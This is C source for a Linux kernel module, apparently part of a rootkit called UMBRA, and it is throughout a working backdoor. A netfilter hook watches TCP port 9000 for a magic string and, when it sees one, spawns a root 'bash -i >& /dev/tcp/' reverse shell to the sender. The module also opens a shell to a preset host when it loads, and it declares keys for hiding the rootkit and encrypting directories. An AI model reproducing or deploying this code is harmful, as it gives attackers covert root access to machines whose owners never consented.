#include "../header/hide.h"
// 真的很不好意思，迫不得已采用了屎山写法，我真的还不会写Makefile，需要写个OS做一些系统的学习！

#ifndef HEADER_NETFILTER_MANAGER
#define HEADER_NETFILTER_MANAGER

#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/ip.h>
#include <linux/tcp.h>

//unsigned int nf_hookfn(unsigned int hook_num, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));

//Netfilter hook options. Newer versions require building the struct ourselves
/*struct def_nf_hook_ops {
    struct list_head list;
    nf_hookfn *hook; //Function to be called
    struct module *owner;
    u_int8_t pf;
    unsigned int hooknum;
    int priority;
};*/

int register_netfilter_hook(void);
void unregister_netfilter_hook(void);

#endif


#ifndef HEADER_UTILS
#define HEADER_UTILS
#include <linux/kernel.h>
#include <linux/workqueue.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kmod.h>


struct shell_params {
    struct work_struct work;
    char* target_ip;
    char* target_port;
};

/**
 * Auxiliary function called by the workqueue which starts the reverse shell
 */ 
void execute_reverse_shell(struct work_struct *work);

/**
 * Starts reverse shell using kernel workqueues, which will run asynchronously
 * @param ip remote IP address to bind
 * @param port remote port to bind
 * @return 0 if OK, 1 if error 
 */ 
int start_reverse_shell(char* ip, char* port);

void execute_module(struct work_struct *work);

#endif

#define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define HOME "HOME=/root"
#define TERM "TERM=xterm"
#define SHELL "/bin/bash"
#define EXEC_P1 "bash -i >& /dev/tcp/"
#define EXEC_P2 " 0>&1"


const char* UMBRA_BACKDOOR_KEY = "UMBRA_PAYLOAD_GET_REVERSE_SHELL";
const char* UMBRA_HIDE_ROOTKIT_KEY = "UMBRA_HIDE_ROOTKIT";
const char* UMBRA_SHOW_ROOTKIT_KEY = "UMBRA_SHOW_ROOTKIT";

const char* UMBRA_ENCRYPT_DIR_KEY = "UMBRA_ENCRYPT_DIR";
#define UMBRA_ENCRYPT_DIR_KEY_BUF_LEN 512
const char* UMBRA_DECRYPT_DIR_KEY = "UMBRA_DECRYPT_DIR";
#define UMBRA_DECRYPT_DIR_KEY_BUF_LEN 512
/**
 * Inspects incoming packets and check correspondence to backdoor packet:
 *      Proto: TCP
 *      Port: 9000
 *      Payload: UMBRA_PAYLOAD_GET_REVERSE_SHELL (or any other payload of above)
 */ 
unsigned int net_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
    //Network headers
    struct iphdr *ip_header;        //ip header
    struct tcphdr *tcp_header;      //tcp header
    struct sk_buff *sock_buff = skb;//sock buffer
    char *user_data;       //data header pointer
    //Auxiliar
    int size;                       //payload size
    char* _data;
    struct tcphdr _tcphdr;
    struct iphdr _iph;
    char ip_source[16];
    //char port[16];

    if (!sock_buff){
        return NF_ACCEPT; //socket buffer empty
    }
    
    ip_header = skb_header_pointer(skb, 0, sizeof(_iph), &_iph);
    if (!ip_header){
        return NF_ACCEPT;
    }

    if(ip_header->protocol==IPPROTO_TCP){ 
        unsigned int dport;
        unsigned int sport;

        tcp_header = skb_header_pointer(skb, ip_header->ihl * 4, sizeof(_tcphdr), &_tcphdr);

        sport = htons((unsigned short int) tcp_header->source);
        dport = htons((unsigned short int) tcp_header->dest);
        if(dport != 9000){
            return NF_ACCEPT; //We ignore those not for port 9000
        }

        size = htons(ip_header->tot_len) - sizeof(_iph) - tcp_header->doff*4;
        _data = kmalloc(size, GFP_KERNEL);

            if (!_data)
                return NF_ACCEPT;
        _data = kmalloc(size, GFP_KERNEL);
        user_data = skb_header_pointer(skb, ip_header->ihl*4 + tcp_header->doff*4, size, &_data);
        if(!user_data){
            printk(KERN_INFO "NULL INFO");
            kfree(_data);
            return NF_ACCEPT;
        }

        printk(KERN_DEBUG "data len : %d\ndata : \n", (int)strlen(user_data));
        printk(KERN_DEBUG "%s\n", user_data);

        if(strlen(user_data)<10){
            return NF_ACCEPT;
        }
        
        if(memcmp(user_data, UMBRA_BACKDOOR_KEY, strlen(UMBRA_BACKDOOR_KEY))==0){
            printk(KERN_INFO "UMBRA:: Received backdoor packet \n");          
            snprintf(ip_source, 16, "%pI4", &ip_header->saddr);
            printk(KERN_INFO "UMBRA:: Shell connecting to %s:%s \n", ip_source, REVERSE_SHELL_PORT);
            start_reverse_shell(ip_source, REVERSE_SHELL_PORT);
            return NF_DROP;
        }

        return NF_ACCEPT;

    }
    return NF_ACCEPT;

}

static struct nf_hook_ops nfho;

int register_netfilter_hook(void){
    int err;
    
    nfho.hook = net_hook;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        err = nf_register_net_hook(&init_net, &nfho);
    #else
        err = nf_register_hook(&nfho);
    #endif
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error registering nf hook");
    }else{
        printk(KERN_INFO "UMBRA:: Registered nethook");
    }
    
    return err;
}

void unregister_netfilter_hook(void){
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
        nf_unregister_net_hook(&init_net, &nfho);
    #else
        nf_unregister_hook(&nfho);
    #endif
    printk(KERN_INFO "UMBRA:: Unregistered nethook");

}



void execute_reverse_shell(struct work_struct *work){
    //We know the strings are allocated right after the work in the struct shell_params, so we cast it
    int err;
    struct shell_params *params = (struct shell_params*)work;
    char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL}; //Null terminated
    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
    char *argv[] = {SHELL, "-c", exec, NULL};
    strcat(exec, EXEC_P1);
    strcat(exec, params->target_ip);
    strcat(exec, "/");
    strcat(exec, params->target_port);
    strcat(exec, EXEC_P2);
    
    err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if(err<0){
        printk(KERN_INFO "KERNEL:: Error executing usermodehelper.\n");
    }
    kfree(exec);
    kfree(params->target_ip);
    kfree(params->target_port);
    kfree(params);

}



int start_reverse_shell(char* ip, char* port){
    //Reserve memory for parameters and start work
    int err;
    struct shell_params *params = kmalloc(sizeof(struct shell_params), GFP_KERNEL);
    if(!params){
        printk(KERN_INFO "UMBRA:: Error allocating memory\n");
        return 1;
    }
    params->target_ip = kstrdup(ip, GFP_KERNEL);
    params->target_port = kstrdup(port, GFP_KERNEL);
    printk(KERN_INFO "Loading work\n");
    INIT_WORK(&params->work, &execute_reverse_shell);

    err = schedule_work(&params->work);
    if(err<0){
        printk(KERN_INFO "UMBRA:: Error scheduling work of starting shell\n");
    }
    return err;

}


#if !defined(CONFIG_X86_64) || (LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0))
#define VERSION_NOT_SUPPORTED
#endif


void shellreverse_exit(void){
    unregister_netfilter_hook();
}

int shellreverse_init(void){
    int err;
    err = register_netfilter_hook();
    if(err){
        return err;
    }
    start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
    return 0;
}

